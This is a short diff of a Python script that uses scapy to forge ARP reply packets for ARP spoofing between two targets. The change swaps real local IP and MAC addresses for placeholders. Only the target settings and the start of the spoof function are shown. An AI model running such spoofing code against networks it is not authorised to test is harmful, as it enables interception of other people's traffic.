@@ -3,11 +3,11 @@
 import scapy.all as scapy
 import time
 
-target_ip_1 = "192.168.43.1"
-target_ip_2 = "192.168.43.215"
-target_mac_1 = "66:44:0e:47:6a:2c"
-target_mac_2 = "00:e0:23:0d:73:4d"
-my_ip = "192.168.43.129"
+target_ip_1 = "xxx.xxx.xxx.xxx"
+target_ip_2 = "xxx.xxx.xxx.xxx"
+target_mac_1 = "ff:ff:ff:ff:ff:ff"
+target_mac_2 = "ff:ff:ff:ff:ff:ff"
+my_ip = "xxx.xxx.xxx.xxx"
 
 def spoof(target_ip, target_mac, spoof_ip):
 	packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
